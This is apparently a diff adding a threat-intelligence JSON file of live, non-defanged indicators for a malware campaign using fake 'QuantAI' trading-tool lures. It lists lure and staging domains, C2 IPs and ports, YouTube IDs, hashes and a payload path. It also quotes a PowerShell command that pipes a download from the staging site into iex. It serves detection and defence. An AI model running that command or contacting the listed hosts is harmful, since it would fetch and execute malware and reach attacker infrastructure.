@@ -1,0 +1,341 @@
+{
+ "_warning": "MACHINE-READABLE, NOT DEFANGED: values are live indicators. Do not browse or fetch them.",
+ "case": "2026-11-quantai",
+ "license": "CC0-1.0",
+ "count": 37,
+ "iocs": [
+  {
+   "type": "domain",
+   "value": "quantai.io",
+   "first_seen": "2026-09-11",
+   "role": "lure",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "Wayback Machine"
+  },
+  {
+   "type": "domain",
+   "value": "quantai.net",
+   "first_seen": "2026-10-26",
+   "role": "lure",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "urlscan.io"
+  },
+  {
+   "type": "domain",
+   "value": "quant-pro.com",
+   "first_seen": "2026-11-09",
+   "role": "lure",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "analyst triage"
+  },
+  {
+   "type": "domain",
+   "value": "quantai.app",
+   "first_seen": "2026-04-21",
+   "role": "lure",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "Wayback Machine; analyst triage"
+  },
+  {
+   "type": "domain",
+   "value": "quant-pro.ai",
+   "first_seen": "2026-11-09",
+   "role": "lure",
+   "verdict": "candidate",
+   "confidence": "low",
+   "source": "analyst triage"
+  },
+  {
+   "type": "domain",
+   "value": "chartsgpt.com",
+   "first_seen": "2026-10-26",
+   "role": "stage",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "urlscan.io; RDAP"
+  },
+  {
+   "type": "url",
+   "value": "https://chartsgpt.com/quant.php?Dio=<COMPUTERNAME>",
+   "first_seen": "2026-10-30",
+   "role": "stage",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "urlscan.io; analyst triage"
+  },
+  {
+   "type": "url",
+   "value": "https://chartsgpt.com/ps.php",
+   "first_seen": "2026-11-09",
+   "role": "stage",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "analyst triage"
+  },
+  {
+   "type": "url",
+   "value": "https://chartsgpt.com/ps2.php",
+   "first_seen": "2026-10-30",
+   "role": "stage",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "urlscan.io"
+  },
+  {
+   "type": "url",
+   "value": "https://chartsgpt.com/boka.7z",
+   "first_seen": "2026-11-09",
+   "role": "stage",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "analyst triage"
+  },
+  {
+   "type": "url",
+   "value": "https://chartsgpt.com/smow.7z",
+   "first_seen": "2026-11-09",
+   "role": "stage",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "analyst triage"
+  },
+  {
+   "type": "url",
+   "value": "https://chartsgpt.com/vh.exe",
+   "first_seen": "2026-11-09",
+   "role": "stage",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "analyst triage"
+  },
+  {
+   "type": "domain",
+   "value": "sonosarcsounds.com",
+   "first_seen": "2026-06-15",
+   "role": "c2",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "RDAP; config file"
+  },
+  {
+   "type": "domain",
+   "value": "sonosarcsounds.net",
+   "first_seen": "2026-06-15",
+   "role": "c2",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "RDAP; config file"
+  },
+  {
+   "type": "ipv4",
+   "value": "192.69.210.252",
+   "first_seen": "2026-11-01",
+   "role": "c2",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "Shodan"
+  },
+  {
+   "type": "endpoint",
+   "value": "192.69.210.252:2084",
+   "first_seen": "2026-11-09",
+   "role": "c2",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "config file"
+  },
+  {
+   "type": "endpoint",
+   "value": "192.69.210.252:1337",
+   "first_seen": "2026-11-01",
+   "role": "c2",
+   "verdict": "malicious",
+   "confidence": "med",
+   "source": "Shodan"
+  },
+  {
+   "type": "youtube-channel",
+   "value": "UCXB43fOyaJWD1o092fOF5Iw",
+   "first_seen": "2026-11-05",
+   "role": "distribution",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "YouTube metadata"
+  },
+  {
+   "type": "youtube-video",
+   "value": "RKeu00DiDzw",
+   "first_seen": "2026-11-05",
+   "role": "distribution",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "YouTube metadata"
+  },
+  {
+   "type": "youtube-video",
+   "value": "D_b9HgmrS4Y",
+   "first_seen": "2026-11-05",
+   "role": "distribution",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "YouTube metadata"
+  },
+  {
+   "type": "sha256",
+   "value": "52004733e5b056318cf87f33fe8039e8e3248f1a418b326f84c2a61ff52f7c23",
+   "first_seen": "2026-09-11",
+   "role": "lure-kit-asset(2.jpg)",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "urlscan.io; Wayback Machine"
+  },
+  {
+   "type": "sha256",
+   "value": "d65aba2368a8bbb5eb9d55504d2fbffa5c1febf144f1124291d0d126e68ee313",
+   "first_seen": "2026-10-28",
+   "role": "lure-kit-asset(4.jpg)",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "urlscan.io"
+  },
+  {
+   "type": "sha256",
+   "value": "985d31edfbf92f66fcd5934c7512173bf8a146f41b11009dd769325f777fa58e",
+   "first_seen": "2026-10-28",
+   "role": "lure-kit-asset(5.jpg)",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "urlscan.io"
+  },
+  {
+   "type": "sha256",
+   "value": "675366f67703c32224abd7040063fd3ca53301ec99af0ae55ec9da58dbbfec9b",
+   "first_seen": "2026-10-26",
+   "role": "lure-kit-asset(favicon.ico quantai.net 648B)",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "urlscan.io"
+  },
+  {
+   "type": "sha256",
+   "value": "dc71c941eaf5aec28a7d7faa3acaf632fc26cee7b75559c175e43661827e1f9f",
+   "first_seen": "2026-09-11",
+   "role": "lure-kit-asset(favicon.ico quantai.io 3459B; shodan mmh3 -888936931)",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "Wayback Machine"
+  },
+  {
+   "type": "sha256",
+   "value": "7c40a7a42508dfe5f81ff77aa386bdf23d163625ef3c60749ff2e6db4869baf4",
+   "first_seen": "2026-09-11",
+   "role": "lure-kit-asset(styles.css quantai.io)",
+   "verdict": "malicious",
+   "confidence": "med",
+   "source": "Wayback Machine"
+  },
+  {
+   "type": "sha256",
+   "value": "f1c5a19c45a7fda2e55e994f002dbeae6063efe974438689038d4e30c134610f",
+   "first_seen": "2026-10-28",
+   "role": "lure-kit-asset(styles.css quantai.net)",
+   "verdict": "malicious",
+   "confidence": "med",
+   "source": "urlscan.io"
+  },
+  {
+   "type": "turnstile-sitekey",
+   "value": "0x4AAAAAAEPGVgD_srJzXb7_",
+   "first_seen": "2026-09-11",
+   "role": "lure",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "page source"
+  },
+  {
+   "type": "turnstile-sitekey",
+   "value": "0x4AAAAAAF0eiSwGvAzjJ92v",
+   "first_seen": "2026-10-26",
+   "role": "lure",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "page source"
+  },
+  {
+   "type": "turnstile-sitekey",
+   "value": "0x4AAAAAAFzmIWEaVA5Cq1V8",
+   "first_seen": "2026-11-09",
+   "role": "lure",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "page source"
+  },
+  {
+   "type": "turnstile-sitekey",
+   "value": "0x4AAAAAADnC0ViZ3yjajUEI",
+   "first_seen": "2026-11-09",
+   "role": "lure",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "page source"
+  },
+  {
+   "type": "netsupport-licensee",
+   "value": "NSM1234",
+   "first_seen": "2026-08-25",
+   "role": "c2",
+   "verdict": "malicious",
+   "confidence": "med",
+   "source": "licence file"
+  },
+  {
+   "type": "cert-cn",
+   "value": "DESKTOP-VIG3E9V",
+   "first_seen": "2026-10-02",
+   "role": "c2",
+   "verdict": "candidate",
+   "confidence": "low",
+   "source": "Shodan"
+  },
+  {
+   "type": "cert-serial",
+   "value": "25:59:22:98:98:22:5a:af:4d:71:14:de:05:b0:88:78",
+   "first_seen": "2026-10-02",
+   "role": "c2",
+   "verdict": "candidate",
+   "confidence": "low",
+   "source": "Shodan"
+  },
+  {
+   "type": "path",
+   "value": "%LOCALAPPDATA%\\Stoservice\\stservice.exe",
+   "first_seen": "2026-11-09",
+   "role": "payload",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "analyst triage"
+  },
+  {
+   "type": "command",
+   "value": "irm \"https://chartsgpt.com/quant.php?Dio=$($env:COMPUTERNAME)\" | iex",
+   "first_seen": "2026-11-09",
+   "role": "stage",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "analyst triage"
+  },
+  {
+   "type": "ipv4",
+   "value": "45.91.202.58",
+   "first_seen": "2026-11-10",
+   "role": "c2",
+   "verdict": "malicious",
+   "confidence": "high",
+   "source": "DNS resolution; check-host.net"
+  }
+ ]
+}
